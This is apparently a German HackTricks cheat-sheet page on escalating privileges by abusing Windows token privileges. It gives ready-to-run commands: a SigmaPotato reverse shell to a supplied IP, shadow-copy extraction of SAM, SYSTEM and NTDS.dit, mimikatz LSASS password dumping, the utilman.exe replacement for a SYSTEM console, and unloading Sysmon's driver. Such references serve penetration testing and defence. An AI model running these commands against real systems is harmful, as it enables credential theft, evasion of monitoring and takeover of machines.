# Missbrauch von Tokens

{{#include ../../banners/hacktricks-training.md}}

## Tokens

Wenn du **nicht weißt, was Windows Access Tokens sind**, lies diese Seite, bevor du fortfährst:


{{#ref}}
access-tokens.md
{{#endref}}

**Möglicherweise kannst du deine Rechte erweitern, indem du Tokens missbrauchst, die du bereits besitzt.**

### SeImpersonatePrivilege

Dieses Privileg ermöglicht einem Prozess, ein Token zu imitieren (aber nicht zu erstellen), wenn er einen Handle auf dieses Token erhalten kann. Ein privilegiertes Token kann von einem Windows-Dienst (DCOM) bezogen werden, indem man ihn dazu bringt, eine NTLM-Authentifizierung gegen einen Exploit durchzuführen. Dadurch kann anschließend ein Prozess mit SYSTEM-Rechten ausgeführt werden.<sup>[[2]](#references)</sup> Dieses Primitive lässt sich mit Tools wie [JuicyPotato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (erfordert, dass WinRM deaktiviert ist), [SweetPotato](https://github.com/CCob/SweetPotato) und [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) ausnutzen.

Eine Loopback-only-Webanwendung kann einen separaten Ansatzpunkt für Coercion darstellen, wenn ein lokaler Benutzer einen authentifizierten Endpunkt erreichen kann, der unter einer privilegierteren Identität eine Anfrage an eine vom Aufrufer ausgewählte URL sendet. Prüfe die Autorisierung und URL-Beschränkungen des Endpunkts, die tatsächliche Identität des ausgehenden Clients und dessen Authentifizierungsverhalten sowie, ob dieser Client einen vom Benutzer mit geringeren Rechten kontrollierten Listener erreichen kann. Ein aktiviertes `SeImpersonatePrivilege`, ein IIS-Listener oder ein URL-Fetch-Parameter allein belegen weder das Vorhandensein eines privilegierten Tokens noch einen Pfad zur Rechteausweitung. Führe diese Prüfung passiv durch; sende während der Enumeration keine Coercion-Anfragen. Siehe die Dokumentation von Microsoft zu [client impersonation](https://learn.microsoft.com/en-us/windows/win32/secauthz/client-impersonation) und [IIS application-pool identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities).

Aktuelle Hinweise für Operatoren:

- **JuicyPotato ist veraltet**: Unter Windows 10 1809+/Server 2019+ solltest du je nach noch erreichbarer RPC/COM-Schnittstelle **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato** oder **PrintSpoofer** bevorzugen.
- Wenn du einen als **`LOCAL SERVICE`** oder **`NETWORK SERVICE`** laufenden Dienst kompromittiert hast und `whoami /priv` ein **gefiltertes Token** ohne `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege` anzeigt, stelle zuerst den **Standard-Parametersatz für Rechte** des Kontos wieder her (zum Beispiel mit **FullPowers**) und versuche anschließend erneut die Potato-Tools.<sup>[[3]](#references)</sup>
- Einige neuere Forks sind für Operatoren einfacher zu bedienen als die Original-Tools. **SigmaPotato** bietet zum Beispiel Reflection- und In-Memory-Ausführung sowie Kompatibilität mit modernen Windows-Versionen, während **PrintNotifyPotato** den PrintNotify-COM-Dienst missbraucht und oft nützlich ist, wenn der klassische Spooler-Pfad deaktiviert ist.

```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```


{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

Es ist **SeImpersonatePrivilege** sehr ähnlich und verwendet dieselbe **Methode**, um ein privilegiertes Token zu erhalten.\
Dieses Privileg ermöglicht es dann, **einem neuen/angehaltenen Prozess ein primäres Token zuzuweisen**. Mit dem privilegierten Impersonation-Token kannst du ein primäres Token ableiten (DuplicateTokenEx).\
Mit dem Token kannst du über 'CreateProcessAsUser' einen **neuen Prozess** erstellen oder einen angehaltenen Prozess erstellen und **das Token festlegen** (im Allgemeinen kannst du das primäre Token eines laufenden Prozesses nicht ändern).<sup>[[2]](#references)</sup>

### SeTcbPrivilege

Wenn dieses Token aktiviert ist, kannst du **KERB_S4U_LOGON** verwenden, um ohne Kenntnis der Anmeldedaten ein **Impersonation-Token** für einen beliebigen anderen Benutzer zu erhalten, dem Token eine **beliebige Gruppe** (Administratoren) hinzuzufügen, die **Integritätsstufe** des Tokens auf "**medium**" zu setzen und dieses Token dem **aktuellen Thread** zuzuweisen (SetThreadToken).<sup>[[2]](#references)</sup>

### SeBackupPrivilege

Dieses Privileg veranlasst das System, **Lesezugriff auf alle Dateien** zu gewähren (beschränkt auf Lesevorgänge). Es wird verwendet, um **die Passwort-Hashes lokaler Administrator-Konten** aus der Registry auszulesen. Anschließend können Tools wie "**psexec**" oder "**wmiexec**" mit dem Hash verwendet werden (Pass-the-Hash-Technik). Diese Technik schlägt jedoch unter zwei Bedingungen fehl: wenn das lokale Administratorkonto deaktiviert ist oder wenn eine Richtlinie administrative Rechte für lokale Administratoren entfernt, die sich remote verbinden.<sup>[[2]](#references)</sup>\
In der Praxis ist der zuverlässigste integrierte Ablauf meist **VSS + `robocopy /b`**: Erstelle/exponiere eine Shadow Copy und kopiere dann `SAM`/`SYSTEM` oder `NTDS.dit` im **Backup-Modus**, wodurch die Datei-ACLs umgangen werden.<sup>[[4]](#references)</sup>

```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```

Du kannst **dieses Privileg missbrauchen** mit:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- indem du **IppSec** in [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec) folgst
- Oder wie im Abschnitt **Privilegieneskalation mit Backup Operators** erklärt:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Dieses Privileg ermöglicht **Schreibzugriff** auf jede Systemdatei, unabhängig von deren Access Control List (ACL). Es eröffnet zahlreiche Möglichkeiten zur Privilegieneskalation, darunter die Möglichkeit, **Dienste zu ändern**, DLL Hijacking durchzuführen und über Image File Execution Options **Debugger** festzulegen, sowie diverse weitere Techniken.<sup>[[2]](#references)</sup>

### SeCreateTokenPrivilege

SeCreateTokenPrivilege ist ein mächtiges Privileg, das besonders nützlich ist, wenn ein Benutzer Tokens imitieren kann, aber auch dann, wenn SeImpersonatePrivilege fehlt. Diese Fähigkeit beruht auf der Möglichkeit, ein Token zu imitieren, das denselben Benutzer repräsentiert und dessen Integritätsstufe nicht höher ist als die des aktuellen Prozesses.<sup>[[2]](#references)</sup>

**Wichtige Punkte:**

- **Impersonation ohne SeImpersonatePrivilege:** Unter bestimmten Bedingungen lässt sich SeCreateTokenPrivilege für eine EoP nutzen, indem Tokens imitiert werden.
- **Bedingungen für die Token-Impersonation:** Für eine erfolgreiche Impersonation muss das Ziel-Token demselben Benutzer gehören und eine Integritätsstufe haben, die kleiner oder gleich der Integritätsstufe des Prozesses ist, der die Impersonation durchführt.
- **Erstellung und Änderung von Impersonation-Tokens:** Benutzer können ein Impersonation-Token erstellen und es durch Hinzufügen der SID (Security Identifier) einer privilegierten Gruppe erweitern.

### SeLoadDriverPrivilege

Dieses Privileg ermöglicht einem Prozess das **Laden und Entladen von Gerätetreibern**, indem ein Registry-Eintrag mit bestimmten Werten für `ImagePath` und `Type` erstellt wird. Da direkter Schreibzugriff auf `HKLM` (HKEY_LOCAL_MACHINE) eingeschränkt ist, kann stattdessen `HKCU` (HKEY_CURRENT_USER) verwendet werden. Allerdings ist ein bestimmter Pfad erforderlich, damit der Kernel den `HKCU`-Eintrag als Treiberkonfiguration erkennt.<sup>[[2]](#references)</sup>

Bei modernen offensiven Einsätzen wird üblicherweise **BYOVD** (bring your own vulnerable driver) verwendet: Lade einen **signierten, aber verwundbaren** Kernel-Treiber und nutze anschließend dessen IOCTLs, um Schutzmechanismen zu deaktivieren oder Kernel-Codeausführung zu erreichen. Beachte, dass bei aktuellen Windows 11-/Server-Builds die **Microsoft vulnerable driver blocklist** und/oder **HVCI/Memory Integrity** häufig ältere öffentliche Exploit-Ketten unwirksam machen. Klassische Beispiele im Stil von `szkg64.sys` sind daher nicht mehr uneingeschränkt zuverlässig.

Dieser Pfad lautet `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, wobei `<RID>` der Relative Identifier des aktuellen Benutzers ist. Innerhalb von `HKCU` muss dieser gesamte Pfad erstellt und müssen zwei Werte festgelegt werden:<sup>[[2]](#references)</sup>

- `ImagePath`, der Pfad zur auszuführenden Binärdatei
- `Type` mit dem Wert `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Vorgehensweise:**

1. Verwende aufgrund des eingeschränkten Schreibzugriffs `HKCU` statt `HKLM`.
2. Erstelle den Pfad `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` in `HKCU`, wobei `<RID>` den Relative Identifier des aktuellen Benutzers bezeichnet.
3. Setze `ImagePath` auf den Ausführungspfad der Binärdatei.
4. Setze `Type` auf `SERVICE_KERNEL_DRIVER` (`0x00000001`).

```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```

Weitere Möglichkeiten, dieses Privileg auszunutzen, findest du unter [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Dies ähnelt **SeRestorePrivilege**. Seine Hauptfunktion ermöglicht es einem Prozess, **das Eigentum an einem Objekt zu übernehmen** und dabei die Anforderung eines expliziten diskretionären Zugriffs zu umgehen, indem WRITE_OWNER-Zugriffsrechte bereitgestellt werden. Dabei übernimmt der Prozess zunächst zu Schreibzwecken das Eigentum am betreffenden Registrierungsschlüssel und ändert anschließend die DACL, um Schreibvorgänge zu ermöglichen.<sup>[[2]](#references)</sup>

```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```

### SeDebugPrivilege

Dieses Privileg ermöglicht das **Debuggen anderer Prozesse**, einschließlich des Lesens und Schreibens im Arbeitsspeicher. Mit diesem Privileg lassen sich verschiedene Strategien zur Memory Injection einsetzen, die die meisten Antivirus- und Host-Intrusion-Prevention-Lösungen umgehen können.<sup>[[2]](#references)</sup>

Denke daran, dass `SeDebugPrivilege` unter modernen Windows-Versionen in der Regel ausreicht, um **nicht geschützte SYSTEM-Prozesse** zu öffnen und ihre Tokens zu duplizieren. Es garantiert jedoch **nicht**, dass du auf **LSASS** zugreifen kannst. Wenn **RunAsPPL / LSA Protection** aktiviert ist, können nicht geschützte Prozesse LSASS nicht lesen oder mit Code injizieren, selbst wenn `SeDebugPrivilege` vorhanden ist. In diesem Fall kannst du ein Token von einem anderen Nicht-PPL-SYSTEM-Prozess stehlen oder stattdessen eine PPL-Umgehung/BYOVD einsetzen, anstatt davon auszugehen, dass `procdump` funktioniert. Ein vollständiges Beispiel zum Kopieren eines Tokens mit `SeDebugPrivilege` + `SeImpersonatePrivilege` findest du auf [dieser Seite](sedebug-+-seimpersonate-copy-token.md).

#### Dump memory

Du kannst [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) aus der [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) verwenden, um **den Arbeitsspeicher eines Prozesses zu erfassen**. Dies kann insbesondere auf den Prozess **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)** zutreffen, der Benutzeranmeldedaten speichert, sobald sich ein Benutzer erfolgreich an einem System angemeldet hat.

Anschließend kannst du diesen Dump in mimikatz laden, um Passwörter zu erhalten:

```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

Ein zuvor gespeicherter, lesbarer LSASS-Dump könnte verfügbar sein, auch wenn das aktuelle Konto keine Berechtigung hat, den laufenden, geschützten Prozess zu erfassen. Betrachte eine Dump-Datei oder ein ähnlich benanntes Archiv zunächst nur als Hinweis: Prüfe den Zugriff und den Inhalt und bewerte anschließend, ob wiederhergestellte Zugangsdaten noch gültig sind und Zugriff auf einen Kontext mit höheren Berechtigungen gewähren. Dateinamen allein beweisen weder, dass ein Archiv einen Dump enthält, noch, dass Zugangsdaten wiederverwendbar sind.

#### RCE

Wenn du eine `NT SYSTEM`-Shell erhalten möchtest, kannst du Folgendes verwenden:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)

```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```

### SeManageVolumePrivilege

Dieses Recht (Wartungsaufgaben für Volumes ausführen) kann privilegierte Volume-Operationen ermöglichen, garantiert aber allein weder einen lesbaren Handle für ein Raw-Volume noch beliebigen Dateizugriff. Geräte-ACLs, Tokenstatus, Windows-Version und angeforderte Operation sind weiterhin relevant. Eine zulässige Volume-Steuerungsoperation kann stattdessen Dateisystem-ACLs ändern; dies ist eine verändernde Aktion, die potenziell das gesamte Volume betrifft. Auf einem CA-Host erfordert Zertifikatsmissbrauch außerdem Zugriff auf verwendbares Private-Key-Material, und für EFS-geschützte Dateien wird weiterhin ein autorisierter Entschlüsselungs- oder Wiederherstellungsschlüssel benötigt. Siehe die detaillierten Voraussetzungen weiter unten.<sup>[[5]](#references)</sup>

Siehe detaillierte Techniken und Gegenmaßnahmen:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## Berechtigungen prüfen

```
whoami /priv
```

Die **als Disabled angezeigten Tokens** können normalerweise aktiviert werden, sodass du häufig sowohl _Enabled_- als auch _Disabled_-Privilegien missbrauchen kannst.

### Alle Tokens aktivieren

Wenn du deaktivierte Privilegien hast, kannst du das Skript [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) verwenden, um alle Tokens zu aktivieren:

```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```

Oder das **Skript**, das in diesem [**Beitrag**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/) eingebettet ist.

## Table

Der vollständige Spickzettel zu Token-Privilegien ist unter [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin) zu finden. Die folgende Zusammenfassung listet nur direkte Möglichkeiten auf, das Privileg auszunutzen, um eine Admin-Sitzung zu erhalten oder vertrauliche Dateien zu lesen.<sup>[[1]](#references)</sup>

| Privileg                   | Auswirkung  | Tool                    | Ausführungspfad                                                                                                                                                                                                                                                                                                                                     | Hinweise                                                                                                                                                                                                                                                                                                                       |
| -------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | Drittanbieter-Tool      | _„Damit könnte ein Benutzer Tokens imitieren und mit Tools wie potato.exe, rottenpotato.exe und juicypotato.exe seine Privilegien bis zum NT-System erhöhen.“_                                                                                                                                                                                   | Vielen Dank an [Aurélien Chalot](https://twitter.com/Defte_) für die Aktualisierung. Ich werde versuchen, das bald eher als Anleitung zu formulieren.                                                                                                                                                                          |
| **`SeBackup`**             | **Bedrohung** | _**Integrierte Befehle**_ | Mit `robocopy /b` oder speziellen SeBackup-fähigen Kopierhilfen vertrauliche Dateien lesen.                                                                                                                                                                                                                                                        | <p>- Besonders nützlich für `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit` und manchmal `%WINDIR%\MEMORY.DMP`.<br><br>- `robocopy` ist praktisch, aber spezielle SeBackup-Cmdlets/APIs sind beim Kopieren gesperrter/geöffneter Dateien oft flexibler.</p>                                                                 |
| **`SeCreateToken`**        | _**Admin**_ | Drittanbieter-Tool      | Mit `NtCreateToken` ein beliebiges Token erstellen, das auch lokale Admin-Rechte enthält.                                                                                                                                                                                                                                                           |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | Ein **nicht-PPL**-SYSTEM-Token duplizieren oder den Speicher eines nicht geschützten Prozesses auslesen.                                                                                                                                                                                                                                           | <p>Das Dumpen von LSASS wird üblicherweise verhindert, wenn RunAsPPL/LSA Protection aktiviert ist.</p><p>Das Skript ist bei [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1) zu finden.</p>                                                                                 |
| **`SeImpersonate`**        | _**Admin**_ | Drittanbieter-Tool      | Die **Potato-Familie** / Named-Pipe-Impersonation verwenden, um SYSTEM zu starten (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato` usw.).                                                                                                                                                                           | <p>Am praktikabelsten bei Dienstkonten wie IIS APPPOOL, MSSQL, geplanten Tasks oder in jedem Kontext, der bereits über `SeImpersonatePrivilege` verfügt.</p>                                                                                                                                                                  |
| **`SeLoadDriver`**         | _**Admin**_ | Drittanbieter-Tool      | <p>1. Einen signierten, aber verwundbaren Kernel-Treiber laden (BYOVD)<br>2. Die IOCTLs des Treibers verwenden, um Kernel-R/W zu erhalten, Sicherheitstools zu deaktivieren oder die Rechte bis SYSTEM zu erhöhen<br><br>Alternativ kann das Privileg verwendet werden, um sicherheitsrelevante Treiber mit dem integrierten Befehl <code>fltMC</code> zu entladen, z. B. mit <code>fltMC sysmondrv</code></p> | <p>Ältere öffentliche Treiber wie <code>szkg64.sys</code> werden auf modernen Windows-Versionen zunehmend durch die Sperrliste für verwundbare Treiber / HVCI blockiert.</p>                                                                                                                                                    |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. PowerShell/ISE mit aktiviertem SeRestore-Privileg starten.<br>2. Das Privileg mit <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a> aktivieren.<br>3. utilman.exe in utilman.old umbenennen<br>4. cmd.exe in utilman.exe umbenennen<br>5. Die Konsole sperren und Win+U drücken</p> | <p>Der Angriff kann von mancher AV-Software erkannt werden.</p><p>Eine alternative Methode beruht darauf, mit demselben Privileg Dienst-Binärdateien in „Program Files“ zu ersetzen.</p>                                                                                                                                      |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Integrierte Befehle**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. cmd.exe in utilman.exe umbenennen<br>4. Die Konsole sperren und Win+U drücken</p>                                                                                                                               | <p>Der Angriff kann von mancher AV-Software erkannt werden.</p><p>Eine alternative Methode beruht darauf, mit demselben Privileg Dienst-Binärdateien in „Program Files“ zu ersetzen.</p>                                                                                                                                     |
| **`SeTcb`**                | _**Admin**_ | Drittanbieter-Tool      | <p>Tokens so manipulieren, dass sie lokale Admin-Rechte enthalten. Möglicherweise ist SeImpersonate erforderlich.</p><p>Noch zu überprüfen.</p>                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- [1] [gtworek/Priv2Admin – Angriffspfade von Windows-Privilegien zu Admin-Rechten](https://github.com/gtworek/Priv2Admin)
- [2] [Missbrauch von Token-Privilegien für LPE](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)
- [3] [itm4n – Gebt mir meine Privilegien zurück! Bitte?](https://itm4n.github.io/localservice-privileges/)
- [4] [Microsoft – Robocopy (`/b`-Backupmodus umgeht Datei-/Ordner-ACL-Prüfungen)](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [5] [Microsoft – Volume-Wartungsaufgaben ausführen (SeManageVolumePrivilege)](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks)
- [6] [0xdf – HTB: Certificate (SeManageVolumePrivilege → CA-Schlüsselexfiltration → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)
{{#include ../../banners/hacktricks-training.md}}
